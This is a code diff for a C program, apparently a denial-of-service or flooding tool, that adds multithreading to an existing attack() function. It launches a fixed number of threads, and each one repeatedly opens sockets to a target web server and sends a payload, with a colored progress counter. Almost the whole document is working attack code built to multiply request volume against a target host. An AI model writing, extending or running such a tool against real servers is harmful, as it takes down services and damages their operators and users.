@@ -6,7 +6,10 @@
 #include <sys/types.h>
 #include <arpa/inet.h>
 
+#include <pthread.h>
+
 #include "attacker.h"
+#include "../color.h"
 
 
 // Generates the payload to send to the server
@@ -26,7 +29,7 @@ static void send_payload(int sock_fd, char *payload) {
 
 
 // Does the request to the web server
-void attack(char *host, char *ip, int16_t port, char *payload) {
+static void attack(char *host, char *ip, int16_t port, char *payload) {
     int sock_fd, i;
     struct sockaddr_in target_addr;
 
@@ -45,4 +48,42 @@ void attack(char *host, char *ip, int16_t port, char *payload) {
 
     shutdown(sock_fd, SHUT_RDWR);
     close(sock_fd);
+}
+
+
+// Thread function that runs attacks
+static void *run_attacks(void *args) {
+    size_t i;
+    struct thread_args *t_args;
+
+    t_args = (struct thread_args *) args;
+    for (i = 0; i < t_args->requests_per_thread; i++) {
+        attack(t_args->host, t_args->ip, t_args->port, t_args->payload);
+    }
+}
+
+
+// Run the threads
+void run_threads(struct thread_args t_args) {
+    size_t i;
+    pthread_t t_id;
+    pthread_t all_threads_id[NUM_THREADS];
+
+    // run the threads
+    for (i = 0; i < NUM_THREADS; i++) {
+        printf( "\rrunning threads: %s%ld%s",
+                LIGHT_RED, i+1, NO_COLOR);
+        fflush(stdout);
+
+        pthread_create(&t_id, NULL, run_attacks, (void *) &t_args);
+        all_threads_id[i] = t_id; // append the thread id
+        usleep(10 * 1000); // wait 10 milliseconds to run the next thread
+    }
+    printf("\n");
+
+    // wait for threads to finish
+    for (i = 0; i < NUM_THREADS; i++) {
+        t_id = all_threads_id[i];
+        pthread_join(t_id, NULL);
+    }
 }
